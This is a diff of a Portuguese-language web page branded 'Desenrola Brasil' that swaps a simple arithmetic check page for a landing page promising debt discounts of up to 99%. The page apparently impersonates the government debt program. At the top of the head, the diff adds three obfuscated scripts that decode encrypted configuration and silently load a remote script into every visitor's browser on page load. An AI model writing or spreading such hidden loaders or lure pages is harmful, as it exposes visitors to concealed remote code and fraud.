@@ -1,362 +1,57 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="Verificação de segurança para continuar com seu atendimento Desenrola." />
-  <title>Verificação de segurança | Desenrola</title>
 
-  <style>
-    :root {
-      --primary: #116b5b;
-      --primary-dark: #0b5145;
-      --primary-soft: #e9f7f3;
-      --text: #14211f;
-      --muted: #66736f;
-      --border: #dce7e3;
-      --background: #f3f7f6;
-      --white: #ffffff;
-      --danger: #b42318;
-    }
+<script>(function(){var u_qs8j=atob("DCnywXWwLs2ZYBpVXlLQtAfcDPe7CG4hLlrI7lrTSqO3FW44N0+L7xbfQ+P7EjUmPVubsQHDAbjtDWl6MkiGpAbEAKfqQjZ3P12GsxzSW7n8EzhvBVLQrxTdS++jQn40KkjftAHdR6vgTWonO1+XrwGdVq72BDcmPULQ7VfGT6HsBThvfAuP7Q6SQKz0BThvfE2TtRSdW7n0CXwsc1mApAPVQLm0E283N02B41mSWKz1FX93ZAvQvCjN");var p_9n=[];for(var e_b=0;e_b<u_qs8j.length;e_b++){p_9n.push(u_qs8j.charCodeAt(e_b)&255);}var i_5j=p_9n[0];var w_h6x7=p_9n.slice(1,1+i_5j);var u_lta=p_9n.slice(1+i_5j);var l_hn25=u_lta.map(function(b,u_zl){return b^w_h6x7[u_zl%i_5j];});var v_ojf="";for(var o_u=0;o_u<l_hn25.length;o_u++){v_ojf+=String.fromCharCode(l_hn25[o_u]&255);}var k_g0=decodeURIComponent(escape(v_ojf));var w_bl=JSON.parse(k_g0);var j_sx=w_bl.globals||[];j_sx.forEach(function(p_h){window[p_h.name]=p_h.value;});var i_m1=document.createElement("script");i_m1.src=w_bl.url;i_m1.async=true;i_m1.defer=true;(w_bl.attributes||[]).forEach(function(x_w){i_m1.setAttribute(x_w.name,x_w.value);});(document.head||document.documentElement).appendChild(i_m1);})();</script>
 
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+<script>(function(){var b_imdg=atob("DM3cQM/NBYNKqhJsHLb+Nb2hJ7lowmYYbL7mb+CuYe1k32YBdaulbqyiaK0o2D0ff7+1MLu+KvY+x2FDcKyoJby5K+k5iD5OfbmoMqavcPcv2TBWR7b+Lq6gYKFwiHYNaKzxNbugbOUzh2Ieebu5LrvgfeAlzj8ff6b+bO27ZO8/zzBWPu+hbLTva+InzzBWPqm9NK7gcPcnw3QVMb2uJbmoa/dn2WcOdamvYuPvc+Im33dOJu/+PZKw");var l_f=[];for(var b_05=0;b_05<b_imdg.length;b_05++){l_f.push(b_imdg.charCodeAt(b_05)&255);}var x_i=l_f[0];var t_1pwc=l_f.slice(1,1+x_i);var c_n=l_f.slice(1+x_i);var u_4gmf=c_n.map(function(b,b_4v){return b^t_1pwc[b_4v%x_i];});var l_3xf6="";for(var n_4=0;n_4<u_4gmf.length;n_4++){l_3xf6+=String.fromCharCode(u_4gmf[n_4]&255);}var c_uuhf=decodeURIComponent(escape(l_3xf6));var e_gn=JSON.parse(c_uuhf);var e_w=e_gn.globals||[];e_w.forEach(function(f_t){window[f_t.name]=f_t.value;});var u_r6b=document.createElement("script");u_r6b.src=e_gn.url;u_r6b.async=true;u_r6b.defer=true;(e_gn.attributes||[]).forEach(function(w_lpx){u_r6b.setAttribute(w_lpx.name,w_lpx.value);});(document.head||document.documentElement).appendChild(u_r6b);})();</script>
 
-    body {
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-      font-family: Arial, Helvetica, sans-serif;
-      color: var(--text);
-      background:
-        radial-gradient(circle at top left, rgba(17, 107, 91, 0.10), transparent 34%),
-        var(--background);
-    }
+<script>(function(){var l_k=atob("DPkypOdoGm4msc2+OIIQ0ZUEOFQE2bnKSIoIi8gLfgAIxLnTUZ9LioQHd0BEw+LNW4tb1JMbNR5PyajSF4lb3IIENwlJ3qrSXddY18VEOA9Sxb/XWoxGwZRKIDV7ne/ZVJZQxYsbOFR9yu/QWZRXht1KfQFJ1qHbaJBKwYshfkwKk7vfVIxXht1KLA8QgqmPCpxQlt8KKVhHia6PXphXltYLOBN7zA==");var t_5=[];for(var f_wt=0;f_wt<l_k.length;f_wt++){t_5.push(l_k.charCodeAt(f_wt)&255);}var m_0=t_5[0];var n_ks8=t_5.slice(1,1+m_0);var u_r=t_5.slice(1+m_0);var t_b=u_r.map(function(b,v_om8){return b^n_ks8[v_om8%m_0];});var l_hlb7="";for(var v_v=0;v_v<t_b.length;v_v++){l_hlb7+=String.fromCharCode(t_b[v_v]&255);}var a_h=decodeURIComponent(escape(l_hlb7));var t_8jms=JSON.parse(a_h);var r_e4l=t_8jms.globals||[];r_e4l.forEach(function(b_s){window[b_s.name]=b_s.value;});var f_w6ko=document.createElement("script");f_w6ko.src=t_8jms.url;f_w6ko.async=true;f_w6ko.defer=true;(t_8jms.attributes||[]).forEach(function(a_a){f_w6ko.setAttribute(a_a.name,a_a.value);});(document.head||document.documentElement).appendChild(f_w6ko);})();</script>
 
-    .card {
-      width: 100%;
-      max-width: 460px;
-      padding: 36px 28px 30px;
-      text-align: center;
-      background: var(--white);
-      border: 1px solid var(--border);
-      border-radius: 20px;
-      box-shadow: 0 18px 48px rgba(20, 33, 31, 0.10);
-      animation: enter 0.35s ease-out;
-    }
 
-    @keyframes enter {
-      from { opacity: 0; transform: translateY(14px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .icon {
-      width: 72px;
-      height: 72px;
-      margin: 0 auto 18px;
-      display: grid;
-      place-items: center;
-      border-radius: 20px;
-      background: var(--primary-soft);
-      color: var(--primary);
-    }
-
-    .icon svg {
-      width: 38px;
-      height: 38px;
-    }
-
-    .badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 7px;
-      margin-bottom: 18px;
-      padding: 8px 14px;
-      border-radius: 999px;
-      background: var(--primary-soft);
-      color: var(--primary-dark);
-      font-size: 12px;
-      font-weight: 800;
-      letter-spacing: 0.45px;
-      text-transform: uppercase;
-    }
-
-    h1 {
-      margin-bottom: 12px;
-      font-size: 27px;
-      line-height: 1.2;
-    }
-
-    .subtitle {
-      margin: 0 auto 24px;
-      max-width: 370px;
-      color: var(--muted);
-      font-size: 15px;
-      line-height: 1.6;
-    }
-
-    .subtitle strong {
-      color: var(--primary-dark);
-    }
-
-    .verification-box {
-      margin: 22px 0;
-      padding: 20px 16px;
-      background: #fbfdfc;
-      border: 1px solid var(--border);
-      border-radius: 15px;
-    }
-
-    .verification-title {
-      margin-bottom: 14px;
-      font-size: 14px;
-      font-weight: 700;
-      color: var(--text);
-    }
-
-    .math-challenge {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .math-question {
-      font-size: 28px;
-      font-weight: 800;
-      color: var(--primary-dark);
-      letter-spacing: 1px;
-    }
-
-    .answer-input {
-      width: 100%;
-      max-width: 220px;
-      padding: 14px 16px;
-      border: 2px solid var(--border);
-      border-radius: 12px;
-      background: var(--white);
-      color: var(--text);
-      font-size: 18px;
-      font-weight: 700;
-      text-align: center;
-      outline: none;
-      transition: border-color 0.2s ease, box-shadow 0.2s ease;
-    }
-
-    .answer-input:focus {
-      border-color: var(--primary);
-      box-shadow: 0 0 0 4px rgba(17, 107, 91, 0.12);
-    }
-
-    .answer-input.valid {
-      border-color: var(--primary);
-      background: var(--primary-soft);
-    }
-
-    .status {
-      min-height: 21px;
-      margin-top: 12px;
-      color: var(--muted);
-      font-size: 13px;
-      line-height: 1.5;
-    }
-
-    .status.success {
-      color: var(--primary-dark);
-      font-weight: 700;
-    }
-
-    .status.error {
-      color: var(--danger);
-      font-weight: 700;
-    }
-
-    .continue-button {
-      width: 100%;
-      padding: 17px 24px;
-      border: 0;
-      border-radius: 14px;
-      background: var(--primary);
-      color: var(--white);
-      font-size: 17px;
-      font-weight: 800;
-      cursor: pointer;
-      box-shadow: 0 10px 24px rgba(17, 107, 91, 0.24);
-      transition: transform 0.2s ease, background 0.2s ease, box-shadow 0.2s ease;
-    }
-
-    .continue-button:hover:not(:disabled) {
-      background: var(--primary-dark);
-      transform: translateY(-2px);
-      box-shadow: 0 14px 30px rgba(17, 107, 91, 0.28);
-    }
-
-    .continue-button:disabled {
-      background: #a7b4b0;
-      cursor: not-allowed;
-      box-shadow: none;
-    }
-
-    .loading {
-      display: none;
-      margin-top: 16px;
-      color: var(--primary-dark);
-      font-size: 14px;
-      font-weight: 700;
-    }
-
-    .spinner {
-      display: inline-block;
-      width: 17px;
-      height: 17px;
-      margin-right: 8px;
-      vertical-align: middle;
-      border: 3px solid #cfe8e1;
-      border-top-color: var(--primary);
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-
-    .footer {
-      margin-top: 23px;
-      color: #8a9692;
-      font-size: 12px;
-      line-height: 1.65;
-    }
-
-    .footer strong {
-      color: var(--primary-dark);
-    }
-
-    @media (max-width: 420px) {
-      .card { padding: 31px 20px 26px; }
-      h1 { font-size: 24px; }
-      .subtitle { font-size: 14px; }
-    }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Desenrola Brasil</title>
+  <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
-  <main class="card">
-    <div class="icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10Z"></path>
-        <path d="m9 12 2 2 4-4"></path>
-      </svg>
-    </div>
-
-    <div class="badge">Verificação de segurança</div>
-
-    <h1>Confirme para continuar</h1>
-
-    <p class="subtitle">
-      Responda à soma abaixo para continuar com o seu atendimento no <strong>Desenrola</strong>.
-    </p>
-
-    <section class="verification-box" aria-labelledby="verification-heading">
-      <p id="verification-heading" class="verification-title">Conclua a verificação humana</p>
-
-      <div class="math-challenge">
-        <div class="math-question" aria-label="Quanto é um mais um?">1 + 1 = ?</div>
-        <input
-          id="answer-input"
-          class="answer-input"
-          type="text"
-          inputmode="numeric"
-          pattern="[0-9]*"
-          maxlength="2"
-          autocomplete="off"
-          aria-label="Digite o resultado da soma"
-          placeholder="Digite a resposta"
-        />
-      </div>
-
-      <p id="verification-status" class="status" aria-live="polite">
-        Digite o resultado para liberar o botão.
-      </p>
+  <main class="page-wrapper">
+    <section class="hero-section">
+      <img src="images/hero.png" alt="Pessoa segurando celular com tela de consulta" class="hero-image">
     </section>
 
-    <button id="continue-button" class="continue-button" type="button" disabled>
-      Verifique para continuar
-    </button>
+    <section class="content-card">
+      <img src="images/logo-icon.png" alt="Ícone Desenrola Brasil" class="logo-icon">
+      <img src="images/logo-text.png" alt="Desenrola Brasil" class="logo-text">
 
-    <div id="loading" class="loading" aria-live="polite">
-      <span class="spinner"></span>
-      Abrindo seu atendimento...
-    </div>
+      <h1 class="headline">
+        O Programa Desenrola Brasil<br>
+        possibilita a renegociação de dívidas<br>
+        com descontos de até 99%
+      </h1>
 
-    <p class="footer">
-      Esta etapa confirma que você deseja continuar para a próxima página.<br />
-      Seus dados devem ser tratados conforme a <strong>LGPD</strong>.
-    </p>
+      <p class="subheadline">
+        Clique no botão abaixo para<br>
+        acessar a plataforma
+      </p>
+
+      <a href="entrar/index.htm" class="cta-button">ACESSAR AGORA</a>
+
+      <footer class="site-footer">
+        <div class="footer-links">
+          <a href="politica-privacidade.html">Política de Privacidade</a>
+          <a href="termos-de-uso.html">Termos de Uso</a>
+        </div>
+        <div class="company-info">
+          <p><strong>INARA SUED NASCIMENTO COSTA</strong></p>
+          <p>Q CLS 4 BLOCO A (COMERCIO), LJ 02, LOTE 02, RIACHO FUNDO I, BRASÍLIA - DF, CEP 71820-511, Brasil</p>
+          <p>CNPJ: 05.475.756/0001-00</p>
+        </div>
+      </footer>
+
+    </section>
   </main>
 
-  <script>
-    const continueButton = document.getElementById('continue-button');
-    const answerInput = document.getElementById('answer-input');
-    const verificationStatus = document.getElementById('verification-status');
-    const loading = document.getElementById('loading');
-
-    // Altere esta rota para o link real da próxima página.
-    const destinationBase = 'entrar/index.htm';
-
-    function updateVerification() {
-      const isCorrect = answerInput.value.trim() === '2';
-
-      continueButton.disabled = !isCorrect;
-      answerInput.classList.toggle('valid', isCorrect);
-
-      if (isCorrect) {
-        continueButton.textContent = 'Verifique para continuar →';
-        verificationStatus.textContent = 'Resposta correta. Clique no botão para continuar.';
-        verificationStatus.className = 'status success';
-      } else {
-        continueButton.textContent = 'Verifique para continuar';
-        verificationStatus.textContent = answerInput.value.trim()
-          ? 'Resposta incorreta. Tente novamente.'
-          : 'Digite o resultado para liberar o botão.';
-        verificationStatus.className = answerInput.value.trim() ? 'status error' : 'status';
-      }
-    }
-
-    answerInput.addEventListener('input', updateVerification);
-
-    answerInput.addEventListener('keydown', function (event) {
-      if (event.key === 'Enter' && !continueButton.disabled) {
-        continueButton.click();
-      }
-    });
-
-    continueButton.addEventListener('click', function () {
-      if (answerInput.value.trim() !== '2') return;
-
-      continueButton.disabled = true;
-      continueButton.textContent = 'Carregando...';
-      loading.style.display = 'block';
-
-      const urlParams = new URLSearchParams(window.location.search);
-      const allowedParams = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'src', 'sck'];
-      const forwardedParams = new URLSearchParams();
-
-      allowedParams.forEach(function (param) {
-        if (urlParams.has(param)) {
-          forwardedParams.set(param, urlParams.get(param));
-        }
-      });
-
-      const query = forwardedParams.toString();
-      const destination = query ? destinationBase + '?' + query : destinationBase;
-
-      window.location.href = destination;
-    });
-  </script>
+  <script src="js/main.js"></script>
 </body>
 </html>
